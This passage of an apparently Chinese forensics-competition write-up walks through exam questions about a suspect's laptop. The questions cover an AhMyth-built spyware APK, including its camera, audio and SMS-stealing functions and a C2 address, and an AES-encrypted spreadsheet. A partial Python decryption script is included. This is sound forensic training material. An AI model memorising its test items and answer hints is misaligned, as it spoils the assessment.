+<h5 id="c.-文件结构不完整">C. 文件结构不完整</h5>
+<h5 id="d.-apk包含加密代码">D. APK包含加密代码</h5>
+<p>这个可以直接ai梭。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/36.png"></p>
+<h4 id="单选题参考ben_laptop.zip内的joshe-lnvestment.apkben使用了哪个工具包生成恶意apk以控制受害者的设备">29.[单选题]参考Ben_Laptop.zip内的Joshe lnvestment.apk，Ben使用了哪个工具包生成恶意APK以控制受害者的设备？</h4>
+<h5 id="a.-metasploit">A. Metasploit</h5>
+<h5 id="b.-spynote">B. SpyNote</h5>
+<h5 id="c.-quasarrat">C. QuasarRAT</h5>
+<h5 id="d.-ahmyth">D. AhMyth</h5>
+<p>这里先把文件导出来。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/37.png"></p>
+<p>用雷电app分析一下，可以看到选D。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/38.png"></p>
+<h4 id="单选题参考ben_laptop.zip内的joshe-lnvestment.apk确认哪个.xml文件被特别添加为主活动activity_main的布局文件">30.[单选题]参考Ben_Laptop.zip内的Joshe lnvestment.apk，确认哪个.xml文件被特别添加为主活动（activity_main）的布局文件？</h4>
+<h5 id="a.-activity_main.xml">A. activity_main.xml</h5>
+<h5 id="b.-main_activity.xml">B. main_activity.xml</h5>
+<h5 id="c.-main.xml">C. main.xml</h5>
+<h5 id="d.-thisismain.xml">D. Thisismain.xml</h5>
+<p>从这里开始后面和apk有关的题基本都要用逆向，就不写了TT。</p>
+<h4 id="单选题参考ben_laptop.zip内的joshe-lnvestment.apk确认被指定为主活动层activity-main-layer.xml文件的公共id">31.[单选题]参考Ben_Laptop.zip内的Joshe lnvestment.apk，确认被指定为主活动层（activity main layer）.xml文件的公共ID？</h4>
+<h5 id="a.0x7f040000">A.0x7f040000</h5>
+<h5 id="b.0x7f050000">B.0x7f050000</h5>
+<h5 id="c.0x7f060000">C.0x7f060000</h5>
+<h5 id="d.0x7f070000">D.0x7f070000</h5>
+<h4 id="单选题参考ben_laptop.zip内的joshe-investment.apk确认应用程序没有要求的权限">32.[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk，确认应用程序没有要求的权限？</h4>
+<h5 id="a.-android.permission.read_contacts">A. android.permission.READ_CONTACTS</h5>
+<h5 id="b.-android.permission.use_fingerprint">B. android.permission.USE_FINGERPRINT</h5>
+<h5 id="c.-android.permission.write_calendar">C. android.permission.WRITE_CALENDAR</h5>
+<h5 id="d.-android.permission.access_fine_location">D. android.permission.ACCESS_FINE_LOCATION</h5>
+<h4 id="单选题参考ben_laptop.zip内的joshe-investment.apkahmythminekingahmyth文件夹下的b.smali文件的主要功能是什么">33.[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk，ahmyth/mine/king/ahmyth/文件夹下的b.smali文件的主要功能是什么？</h4>
+<h5 id="a.-管理网络连接">A. 管理网络连接</h5>
+<h5 id="b.-处理相机操作并捕捉图像">B. 处理相机操作并捕捉图像</h5>
+<h5 id="c.-管理应用程序设置">C. 管理应用程序设置</h5>
+<h5 id="d.-处理数据库操作">D. 处理数据库操作</h5>
+<h4 id="单选题参考ben_laptop.zip内的joshe-investment.apk在ahmythminekingahmyth文件夹下的b.smali文件中字节数组byte-array在发送到服务器之前执行了哪一系列操作最终的图像格式是">34.[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk，在ahmyth/mine/king/ahmyth/文件夹下的b.smali文件中，字节数组（Byte Array）在发送到服务器之前执行了哪一系列操作，最终的图像格式是？</h4>
+<h5 id="a.-字节数组被译码加密转换为png格式并发送到服务器">A. 字节数组被译码、加密、转换为PNG格式，并发送到服务器</h5>
+<h5 id="b.-字节数组被译码压缩成jpeg格式并封装到jsonobiect中再发送到服务器">B. 字节数组被译码、压缩成JPEG格式，并封装到JSONObiect中再发送到服务器</h5>
+<h5 id="c.-字节数组被编码为string压缩成bmp格式转换为字节数组并发送">C. 字节数组被编码为String，压缩成BMP格式，转换为字节数组并发送</h5>
+<h5 id="d.-字节数组被编码为string压缩成jpeg格式转换为字节数组并发送">D. 字节数组被编码为String，压缩成JPEG格式，转换为字节数组并发送</h5>
+<h4 id="单选题参考ben_laptop.zip内的joshe-investment.apk在-ahmythminekingahmyth文件夹下的b.smali文件中图像在发送到服务器時的压缩比率是多少">35.[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk，在 ahmyth/mine/king/ahmyth/文件夹下的b.smali文件中，图像在发送到服务器時的压缩比率是多少？</h4>
+<h5 id="a.50">A.50%</h5>
+<h5 id="b.30">B.30%</h5>
+<h5 id="c.20">C.20%</h5>
+<h5 id="d.10">D.10%</h5>
+<h4 id="单选题参考ben_laptop.zip内的joshe-investment.apk在ahmythminekingahmyth文件夹下的connectionmanager.smali中sendreq-method的目的是什么">36.[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk，在ahmyth/mine/king/ahmyth/文件夹下的ConnectionManager.smali中，sendReq method的目的是什么？</h4>
+<h5 id="a.-c2服务器向受感染的设备发送请求">A. C2服务器向受感染的设备发送请求</h5>
+<h5 id="b.-处理用户接口的更新">B. 处理用户接口的更新</h5>
+<h5 id="c.-建立到c2服务器的网络连接">C. 建立到C2服务器的网络连接</h5>
+<h5 id="d.-管理应用程序设置">D. 管理应用程序设置</h5>
+<h4 id="单选题承上题参考ben-laptop.zip内的joshe-investment.apkc2服务器的ip地址及端口号">37.[单选题]承上题，参考Ben Laptop.zip内的Joshe Investment.apk，C2服务器的IP地址及端口号？</h4>
+<h5 id="a.-ip192.168.1.18080">A. IP:192.168.1.1:8080</h5>
+<h5 id="b.-ip10.0.0.180">B. IP:10.0.0.1:80</h5>
+<h5 id="c.-ip172.16.0.1443">C. IP:172.16.0.1:443</h5>
+<h5 id="d.-ip59.152.211.114444">D. IP:59.152.211.11:4444</h5>
+<h4 id="单选题参考ben_laptop.zip内的joshe-investment.apkahmythminekingahmyth文件夹下的g.smali文件中mediarecorder被初始化用于录音如果setaudiosource方法使用了错误的参数会发生什么且这将如何影响录音过程的功能">38.[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk，ahmyth/mine/king/ahmyth/文件夹下的g.smali文件中，MediaRecorder被初始化用于录音。如果setAudioSource()方法使用了错误的参数，会发生什么，且这将如何影响录音过程的功能？</h4>
+<h5 id="a.-应用将以默认设置继续录音但音质可能会降低">A. 应用将以默认设置继续录音，但音质可能会降低</h5>
+<h5 id="b.-mediarecorder会抛出illegalstateexception并阻止录音的开始">B. MediaRecorder会抛出IllegalStateException，并阻止录音的开始</h5>
+<h5 id="c.-录音将继续但文件格式将与指走的输出格式不兼容">C. 录音将继续，但文件格式将与指走的输出格式不兼容</h5>
+<h5 id="d.-应用只会在调用start方法后由于无效的音频编码而崩溃">D. 应用只会在调用start()方法后由于无效的音频编码而崩溃</h5>
+<h4 id="单选题参考ben_laptop.zip内的joshe-investment.apkahmythminekingahmyth文件夹下的g.smali文件中timertask用于在启动mediarecorder后调度动作timertask在这个过程中有什么作用">39.[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk，ahmyth/mine/king/ahmyth/文件夹下的g.smali文件中，TimerTask用于在启动MediaRecorder后调度动作。TimerTask在这个过程中有什么作用？</h4>
+<h5 id="a.-它以设定的间隔暂停录音以更好地管理资源">A. 它以设定的间隔暂停录音，以更好地管理资源</h5>
+<h5 id="b.-它通过在设定的间隔调整录音参数来提高音质">B. 它通过在设定的间隔调整录音参数来提高音质</h5>
+<h5 id="c.-它定期压缩录制的音讯文件以节省存储空间">C. 它定期压缩录制的音讯文件以节省存储空间</h5>
+<h5 id="d.-它监控录音时长并根据录音时间安排事件">D. 它监控录音时长，并根据录音时间安排事件</h5>
+<h4 id="单选题参考ben_laptop.zip内的joshe-investment.apk在ahmythminekingahmyth文件夹下的h.smali文件中method-a和method-b的主要功能有什么区别">40.[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk，在ahmyth/mine/king/ahmyth/文件夹下的h.smali文件中，method a()和method b()的主要功能有什么区别？</h4>
+<h5 id="a.-method-a是检索存储在设备上的联系人清单并将其格式化为jsonarray而method-b是从被入侵的设备向联系人发送消息">A. Method a()是检索存储在设备上的联系人清单并将其格式化为JSONArray，而method b()是从被入侵的设备向联系人发送消息</h5>
+<h5 id="b.-method-a是收集收件箱中的所有sms短信而method-b是利用被入侵的设备发送sms短信">B. Method a()是收集收件箱中的所有SMS短信，而method b()是利用被入侵的设备发送SMS短信</h5>
+<h5 id="c.-method-a是向指定的电话号码发送包含自定义消息内容的sms短信method-b是接收发送确认">C. Method a()是向指定的电话号码发送包含自定义消息内容的SMS短信，method b()是接收发送确认</h5>
+<h5 id="d.-method-a是从设备中检索mms短信而method-b是使用被入侵的设备发送mms短信">D. Method a()是从设备中检索MMS短信，而method b()是使用被入侵的设备发送MMS短信</h5>
+<h4 id="单选题参考ben_laptop.zip内的joshe-investment.apk在ahmythminekingahmyth文件夹下的h.smali文件中method-b需要哪些参数">41.[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk，在ahmyth/mine/king/ahmyth/文件夹下的h.smali文件中，method b()需要哪些参数？</h4>
+<h5 id="a.-method-b请求两个字符串参数联系人姓名和联系人号码">A. method b()请求两个字符串参数，联系人姓名和联系人号码</h5>
+<h5 id="b.-method-b请求一个文件路径的字符串参数和一个数据内容的字符串参数">B. method b()请求一个文件路径的字符串参数和一个数据内容的字符串参数</h5>
+<h5 id="c.-method-b请求一个url的字符串参数和一个负载数据的字符串参数">C. method b()请求一个URL的字符串参数和一个负载数据的字符串参数</h5>
+<h5 id="d.-method-b请求两个字符串参数接收者的电话号码和消息内容">D. method b()请求两个字符串参数，接收者的电话号码和消息内容</h5>
+<h4 id="单选题在分析ben的笔记本电脑时你从调查人员那里获得了以下信息在对一名被捕的犯罪集团成员进行审问时获得的情报显示ben对john心怀怨恨因为john扣留了ben的犯罪收益份额因此ben加密了john的机密文件夹以限制他的访问参考ben_laptop.zip解密secretexcel.encrypted的第一步应该是什么">42.[单选题]在分析Ben的笔记本电脑时，你从调查人员那里获得了以下信息：在对一名被捕的犯罪集团成员进行审问时获得的情报显示，Ben对John心怀怨恨，因为John扣留了Ben的犯罪收益份额。因此，Ben加密了John的机密文件夹，以限制他的访问。参考Ben_Laptop.zip，解密secretExcel.encrypted的第一步应该是什么？</h4>
+<h5 id="a.-生成新的随机密钥">A. 生成新的随机密钥</h5>
+<h5 id="b.-打开加密文件并读取文件的前16个字节">B. 打开加密文件并读取文件的前16个字节</h5>
+<h5 id="c.-压缩加密档">C. 压缩加密档</h5>
+<h5 id="d.-删除加密档">D. 删除加密档</h5>
+<h4 id="单选题参考ben_laptop.zip在加密文件secretexcel.encrypted中初始向量-lnitial-vector的值是什么">43.[单选题]参考Ben_Laptop.zip，在加密文件secretExcel.encrypted中，初始向量 （lnitial Vector）的值是什么？</h4>
+<h5 id="a.-64f4e21c1e4cc3a60137da79e75bf973">A. 64f4e21c1e4cc3a60137da79e75bf973</h5>
+<h5 id="b.-a6b7e84f91827c3d2a94bfed7b5ca9d1">B. a6b7e84f91827c3d2a94bfed7b5ca9d1</h5>
+<h5 id="c.-3b29d2a46aab93bba07c6893d1b8e93a">C. 3b29d2a46aab93bba07c6893d1b8e93a</h5>
+<h5 id="d.-7f8d9b2a14c5aef3786d12c4b6e2d4f9">D. 7f8d9b2a14c5aef3786d12c4b6e2d4f9</h5>
+<p>先导出文件，同目录下四个文件一起导出。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/41.png"></p>
+<p>把加密代码扔给ai，前16个字节用010看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/43.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/44.png"></p>
+<h4 id="单选题参考ben_laptop.zip在加密文件secretexcel.encrypted中盐值salt是什么">44.[单选题]参考Ben_Laptop.zip，在加密文件secretExcel.encrypted中，盐值（SALT）是什么？</h4>
+<h5 id="a.5d5ca840accf95169288de5bf85dacd7bb05ad888afac26efd05cc436c4a5424">A.5d5ca840accf95169288de5bf85dacd7bb05ad888afac26efd05cc436c4a5424</h5>
+<h5 id="b.a3d9f0e4b7c8d5a9c2e7f0b3a5d7c6b1b8e7a2f9c3d1e4f5a6b9c0d7e1f2b4c8">B.a3d9f0e4b7c8d5a9c2e7f0b3a5d7c6b1b8e7a2f9c3d1e4f5a6b9c0d7e1f2b4c8</h5>
+<h5 id="c.f2e1d0c9b8a7f6e5d4c3b2a1e8f7d6c5b4a3d2f1e0c9b8a7d6e5c4b3a2f1e0d9">C.f2e1d0c9b8a7f6e5d4c3b2a1e8f7d6c5b4a3d2f1e0c9b8a7d6e5c4b3a2f1e0d9</h5>
+<h5 id="d.c7b6a5d4e3f2d1c0e9d8b7a6f5e4d3c2b1a0e9f8d7c6b5a4b3c2d1e0f9e8d7c6">D.c7b6a5d4e3f2d1c0e9d8b7a6f5e4d3c2b1a0e9f8d7c6b5a4b3c2d1e0f9e8d7c6</h5>
+<p>ai一下，然后用010看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/46.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/45.png"></p>
+<h4 id="单选题参考ben_laptop.zip查看encrypt.py代码如果更改pbkdf2的count参数会产生什么影响">45.[单选题]参考Ben_Laptop.zip，查看’encrypt.py’代码，如果更改’PBKDF2’的’count’参数会产生什么影响？</h4>
+<h5 id="a.-仅影响解密时所需的计算性能">A. 仅影响解密时所需的计算性能</h5>
+<h5 id="b.-仅影响加密的安全性">B. 仅影响加密的安全性</h5>
+<h5 id="c.-同时影响所需的计算性能和安全性">C. 同时影响所需的计算性能和安全性</h5>
+<h5 id="d.-没有影响">D. 没有影响</h5>
+<p><img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/47.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/48.png"></p>
+<h4 id="单选题参考ben_laptop.zip根据分析及计算后解密secrectexcel.encrypted所用的key具体值是什么3分">46.[单选题]参考Ben_Laptop.zip，根据分析及计算后，解密secrectExcel.encrypted所用的key具体值是什么？（3分）</h4>
+<h5 id="ab2t297wf995y0e660392z6411p0794955">A:b’2T297wf995Y)0e660392z6411P07@94955’</h5>
+<h5 id="bbt_1e86_01958361s4m6wh48">B:b’/T_1e86_01958361S4m6wH48’</h5>
+<h5 id="cb15905858h8740o8a19605b93g40q878e8c">C:b’15905858h8740O8a19605b93g4,0Q878e8c’</h5>
+<h5 id="dbq21fvo61f8c518030b937us8a1e23810504">D:b’q!21fvo6]1f8c518030b937/us8a1e;23810504’</h5>
+<p>这题让ai给一个脚本，把password输进去。</p>
+<pre class="sourceCode python" id="cb1"><code class="sourceCode python"><div class="sourceLine" id="cb1-1" data-line-number="1"><span class="im">import</span> os</div>
+<div class="sourceLine" id="cb1-2" data-line-number="2"><span class="im">from</span> Crypto.Cipher <span class="im">import</span> AES</div>
+<div class="sourceLine" id="cb1-3" data-line-number="3"><span class="im">from</span> Crypto.Protocol.KDF <span class="im">import</span> PBKDF2</div>
+<div class="sourceLine" id="cb1-4" data-line-number="4"><span class="im">from</span> Crypto.Util.Padding <span class="im">import</span> unpad</div>
+<div class="sourceLine" id="cb1-5" data-line-number="5"></div>
+<div class="sourceLine" id="cb1-6" data-line-number="6"><span class="kw">def</span> decrypt_and_find_key(encrypted_file, password):</div>
+<div class="sourceLine" id="cb1-7" data-line-number="7">    <span class="co">"""使用密码解密文件并找到正确的密钥"""</span></div>
+<div class="sourceLine" id="cb1-8" data-line-number="8">    <span class="bu">print</span>(<span class="st">"开始解密文件..."</span>)</div>
+<div class="sourceLine" id="cb1-9" data-line-number="9">    <span class="bu">print</span>(<span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-10" data-line-number="10">    <span class="bu">print</span>(<span class="ss">f"密码: </span><span class="sc">{</span>password<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-11" data-line-number="11">    <span class="bu">print</span>(<span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-12" data-line-number="12">    </div>
+<div class="sourceLine" id="cb1-13" data-line-number="13">    <span class="cf">try</span>:</div>
+<div class="sourceLine" id="cb1-14" data-line-number="14">        <span class="co"># 读取加密文件</span></div>
+<div class="sourceLine" id="cb1-15" data-line-number="15">        <span class="cf">with</span> <span class="bu">open</span>(encrypted_file, <span class="st">'rb'</span>) <span class="im">as</span> f:</div>
+<div class="sourceLine" id="cb1-16" data-line-number="16">            iv <span class="op">=</span> f.read(<span class="dv">16</span>)  <span class="co"># 前16字节是IV</span></div>
+<div class="sourceLine" id="cb1-17" data-line-number="17">            salt <span class="op">=</span> f.read(<span class="dv">32</span>)  <span class="co"># 接下来32字节是Salt</span></div>
+<div class="sourceLine" id="cb1-18" data-line-number="18">            encrypted_data <span class="op">=</span> f.read()  <span class="co"># 剩余的是加密数据</span></div>
+<div class="sourceLine" id="cb1-19" data-line-number="19">        </div>
+<div class="sourceLine" id="cb1-20" data-line-number="20">        <span class="bu">print</span>(<span class="ss">f"IV (十六进制): </span><span class="sc">{iv.</span><span class="bu">hex</span>()<span class="sc">.</span>upper()<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-21" data-line-number="21">        <span class="bu">print</span>(<span class="ss">f"SALT (十六进制): </span><span class="sc">{</span>salt<span class="sc">.</span><span class="bu">hex</span>()<span class="sc">.</span>upper()<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-22" data-line-number="22">        <span class="bu">print</span>(<span class="ss">f"加密数据长度: </span><span class="sc">{</span><span class="bu">len</span>(encrypted_data)<span class="sc">}</span><span class="ss"> 字节"</span>)</div>
+<div class="sourceLine" id="cb1-23" data-line-number="23">        <span class="bu">print</span>(<span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-24" data-line-number="24">        </div>
+<div class="sourceLine" id="cb1-25" data-line-number="25">        <span class="co"># 使用PBKDF2派生密钥</span></div>
+<div class="sourceLine" id="cb1-26" data-line-number="26">        key <span class="op">=</span> PBKDF2(password, salt, dkLen<span class="op">=</span><span class="dv">32</span>, count<span class="op">=</span><span class="dv">100000000</span>)</div>
+<div class="sourceLine" id="cb1-27" data-line-number="27">        <span class="bu">print</span>(<span class="ss">f"计算出的密钥: </span><span class="sc">{</span>key<span class="sc">.</span><span class="bu">hex</span>()<span class="sc">.</span>upper()<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-28" data-line-number="28">        <span class="bu">print</span>(<span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-29" data-line-number="29">        </div>
+<div class="sourceLine" id="cb1-30" data-line-number="30">        <span class="co"># 解密数据</span></div>
+<div class="sourceLine" id="cb1-31" data-line-number="31">        cipher <span class="op">=</span> AES.new(key, AES.MODE_CBC, iv)</div>
+<div class="sourceLine" id="cb1-32" data-line-number="32">        decrypted_data <span class="op">=</span> unpad(cipher.decrypt(encrypted_data), AES.block_size)</div>
+<div class="sourceLine" id="cb1-33" data-line-number="33">        </div>
+<div class="sourceLine" id="cb1-34" data-line-number="34">        <span class="co"># 保存解密文件</span></div>
+<div class="sourceLine" id="cb1-35" data-line-number="35">        output_file <span class="op">=</span> <span class="st">"decrypted_secret.xlsx"</span></div>
+<div class="sourceLine" id="cb1-36" data-line-number="36">        <span class="cf">with</span> <span class="bu">open</span>(output_file, <span class="st">'wb'</span>) <span class="im">as</span> f:</div>
+<div class="sourceLine" id="cb1-37" data-line-number="37">            f.write(decrypted_data)</div>
+<div class="sourceLine" id="cb1-38" data-line-number="38">        </div>
+<div class="sourceLine" id="cb1-39" data-line-number="39">        <span class="bu">print</span>(<span class="ss">f"✅ 解密成功!"</span>)</div>
+<div class="sourceLine" id="cb1-40" data-line-number="40">        <span class="bu">print</span>(<span class="ss">f"✅ 生成文件: </span><span class="sc">{</span>output_file<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-41" data-line-number="41">        </div>
+<div class="sourceLine" id="cb1-42" data-line-number="42">        <span class="co"># 验证文件类型</span></div>
+<div class="sourceLine" id="cb1-43" data-line-number="43">        <span class="cf">if</span> decrypted_data[:<span class="dv">4</span>] <span class="op">==</span> b<span class="st">'PK</span><span class="ch">\x03\x04</span><span class="st">'</span>:</div>
+<div class="sourceLine" id="cb1-44" data-line-number="44">            <span class="bu">print</span>(<span class="st">"✅ 文件类型: Excel文件 (.xlsx)"</span>)</div>
+<div class="sourceLine" id="cb1-45" data-line-number="45">        <span class="cf">elif</span> decrypted_data[:<span class="dv">8</span>] <span class="op">==</span> b<span class="st">'</span><span class="ch">\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1</span><span class="st">'</span>:</div>
+<div class="sourceLine" id="cb1-46" data-line-number="46">            <span class="bu">print</span>(<span class="st">"✅ 文件类型: Excel文件 (.xls)"</span>)</div>
+<div class="sourceLine" id="cb1-47" data-line-number="47">        <span class="cf">else</span>:</div>
+<div class="sourceLine" id="cb1-48" data-line-number="48">            <span class="bu">print</span>(<span class="st">"⚠️  文件类型: 未知 (但解密成功)"</span>)</div>
+<div class="sourceLine" id="cb1-49" data-line-number="49">        </div>
+<div class="sourceLine" id="cb1-50" data-line-number="50">        <span class="co"># 与选项对比</span></div>
+<div class="sourceLine" id="cb1-51" data-line-number="51">        options <span class="op">=</span> {</div>
+<div class="sourceLine" id="cb1-52" data-line-number="52">            <span class="st">'A'</span>: b<span class="st">'</span><span class="ch">\xb2</span><span class="st">T</span><span class="ch">\xc2\xb9\xb7</span><span class="st">wf9</span><span class="ch">\x95</span><span class="st">Y</span><span class="ch">\xcc</span><span class="st">)</span><span class="ch">\xec\xff\x0e\xb6\xf6\x03\x92</span><span class="st">z</span><span class="ch">\xc6\xe4\x11</span><span class="st">P</span><span class="ch">\x07</span><span class="st">@</span><span class="ch">\x94\xbc</span><span class="st">l</span><span class="ch">\xfd\x95\xc5</span><span class="st">'</span>,</div>
+<div class="sourceLine" id="cb1-53" data-line-number="53">            <span class="st">'B'</span>: b<span class="st">'/T_</span><span class="ch">\r\x1e\xb8\xe6</span><span class="st">_</span><span class="ch">\xcd\x01\x95\xde\xb8\r\xb3\xb6\n</span><span class="st">Vp</span><span class="ch">\xeb\xf1</span><span class="st">S</span><span class="ch">\xb4</span><span class="st">m</span><span class="ch">\xd6</span><span class="st">wH</span><span class="ch">\xc4\xc8\xcf\xed</span><span class="st">'</span>,</div>
+<div class="sourceLine" id="cb1-54" data-line-number="54">            <span class="st">'C'</span>: b<span class="st">'</span><span class="ch">\xea\x15\xf9\x05\x85\xe8</span><span class="st">h</span><span class="ch">\x87\xc4\xf0</span><span class="st">O</span><span class="ch">\x8a\xba</span><span class="st">1</span><span class="ch">\x96\x05</span><span class="st">b</span><span class="ch">\xf9\xa3</span><span class="st">g</span><span class="ch">\xba</span><span class="st">Mm</span><span class="ch">\xa4\t</span><span class="st">,</span><span class="ch">\xe0</span><span class="st">Q</span><span class="ch">\x87\x8e\xfb\x8c</span><span class="st">'</span>,</div>
+<div class="sourceLine" id="cb1-55" data-line-number="55">            <span class="st">'D'</span>: b<span class="st">'q!</span><span class="ch">\xae</span><span class="st">2</span><span class="ch">\x1f</span><span class="st">vo</span><span class="ch">\xb6</span><span class="st">]</span><span class="ch">\xfb\x1f\x8c\xe5\x18\x03\x0b\xcc\xc9</span><span class="st">3</span><span class="ch">\xf7</span><span class="st">/us</span><span class="ch">\x8a\x1e</span><span class="st">;</span><span class="ch">\xd2\xe3\x81\x05\xaa\x04</span><span class="st">'</span></div>
+<div class="sourceLine" id="cb1-56" data-line-number="56">        }</div>
+<div class="sourceLine" id="cb1-57" data-line-number="57">        </div>
+<div class="sourceLine" id="cb1-58" data-line-number="58">        <span class="bu">print</span>(<span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-59" data-line-number="59">        <span class="bu">print</span>(<span class="st">"与选项对比结果:"</span>)</div>
+<div class="sourceLine" id="cb1-60" data-line-number="60">        <span class="bu">print</span>(<span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-61" data-line-number="61">        </div>
+<div class="sourceLine" id="cb1-62" data-line-number="62">        correct_option <span class="op">=</span> <span class="va">None</span></div>
+<div class="sourceLine" id="cb1-63" data-line-number="63">        <span class="cf">for</span> option, key_bytes <span class="kw">in</span> options.items():</div>
+<div class="sourceLine" id="cb1-64" data-line-number="64">            <span class="cf">if</span> key <span class="op">==</span> key_bytes:</div>
+<div class="sourceLine" id="cb1-65" data-line-number="65">                correct_option <span class="op">=</span> option</div>
+<div class="sourceLine" id="cb1-66" data-line-number="66">                <span class="bu">print</span>(<span class="ss">f"🎉 正确答案: 选项 </span><span class="sc">{</span>option<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-67" data-line-number="67">                <span class="bu">print</span>(<span class="ss">f"🔑 匹配密钥: </span><span class="sc">{</span>key_bytes<span class="sc">.</span><span class="bu">hex</span>()<span class="sc">.</span>upper()<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-68" data-line-number="68">                <span class="cf">break</span></div>
+<div class="sourceLine" id="cb1-69" data-line-number="69">            <span class="cf">else</span>:</div>
+<div class="sourceLine" id="cb1-70" data-line-number="70">                <span class="bu">print</span>(<span class="ss">f"❌ 选项 </span><span class="sc">{</span>option<span class="sc">}</span><span class="ss"> 不匹配"</span>)</div>
+<div class="sourceLine" id="cb1-71" data-line-number="71">        </div>
+<div class="sourceLine" id="cb1-72" data-line-number="72">        <span class="cf">if</span> correct_option:</div>
+<div class="sourceLine" id="cb1-73" data-line-number="73">            <span class="bu">print</span>(<span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-74" data-line-number="74">            <span class="bu">print</span>(<span class="ss">f"最终答案: </span><span class="sc">{</span>correct_option<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-75" data-line-number="75">            <span class="bu">print</span>(<span class="ss">f"密钥值: </span><span class="sc">{</span>key<span class="sc">.</span><span class="bu">hex</span>()<span class="sc">.</span>upper()<span class="sc">}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-76" data-line-number="76">        <span class="cf">else</span>:</div>
+<div class="sourceLine" id="cb1-77" data-line-number="77">            <span class="bu">print</span>(<span class="st">"⚠️  警告: 计算出的密钥与提供的选项都不匹配"</span>)</div>
+<div class="sourceLine" id="cb1-78" data-line-number="78">            <span class="bu">print</span>(<span class="st">"但解密已成功完成，请检查生成的文件"</span>)</div>
+<div class="sourceLine" id="cb1-79" data-line-number="79">        </div>
+<div class="sourceLine" id="cb1-80" data-line-number="80">        <span class="cf">return</span> key, correct_option</div>
+<div class="sourceLine" id="cb1-81" data-line-number="81">        </div>
+<div class="sourceLine" id="cb1-82" data-line-number="82">    <span class="cf">except</span> <span class="pp">Exception</span> <span class="im">as</span> e:</div>
+<div class="sourceLine" id="cb1-83" data-line-number="83">        <span class="bu">print</span>(<span class="ss">f"❌ 解密失败: </span><span class="sc">{e}</span><span class="ss">"</span>)</div>
+<div class="sourceLine" id="cb1-84" data-line-number="84">        <span class="cf">return</span> <span class="va">None</span>, <span class="va">None</span></div>
+<div class="sourceLine" id="cb1-85" data-line-number="85"></div>
+<div class="sourceLine" id="cb1-86" data-line-number="86"><span class="kw">def</span> verify_key_options(calculated_key):</div>
+<div class="sourceLine" id="cb1-87" data-line-number="87">    <span class="co">"""详细验证每个密钥选项"""</span></div>
+<div class="sourceLine" id="cb1-88" data-line-number="88">    <span class="bu">print</span>(<span class="st">"</span><span class="ch">\n</span><span class="st">"</span> <span class="op">+</span> <span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-89" data-line-number="89">    <span class="bu">print</span>(<span class="st">"详细密钥对比:"</span>)</div>
+<div class="sourceLine" id="cb1-90" data-line-number="90">    <span class="bu">print</span>(<span class="st">"="</span> <span class="op">*</span> <span class="dv">60</span>)</div>
+<div class="sourceLine" id="cb1-91" data-line-number="91">    </div>
+<div class="sourceLine" id="cb1-92" data-line-number="92">    options <span class="op">=</span> {</div>
+<div class="sourceLine" id="cb1-93" data-line-number="93">        <span class="st">'A'</span>: b<span class="st">'</span><span class="ch">\xb2</span><span class="st">T</span><span class="ch">\xc2\xb9\xb7</span><span class="st">wf9</span><span class="ch">\x95</span><span class="st">Y</span><span class="ch">\xcc</span><span class="st">)</span><span class="ch">\xec\xff\x0e\xb6\xf6\x03\x92</span><span class="st">z</span><span class="ch">\xc6\xe4\x11</span><span class="st">P</span><span class="ch">\x07</span><span class="st">@</span><span class="ch">\x94\xbc</span><span class="st">l</span><span class="ch">\xfd\x95\xc5</span><span class="st">'</span>,</div>
+<div class="sourceLine" id="cb1-94" data-line-number="94">        <span class="st">'B'</span>: b<span class="st">'/T_</span><span class="ch">\r\x1e\xb8\xe6</span><span class="st">_</span><span class="ch">\xcd\x01\x95\xde\xb8\r\xb3\xb6\n</span><span class="st">Vp</span><span class="ch">\xeb\xf1</span><span class="st">S</span><span class="ch">\xb4</span><span class="st">m</span><span class="ch">\xd6</span><span class="st">wH</span><span class="ch">\xc4\xc8\xcf\xed</span><span class="st">'</span>,</div>
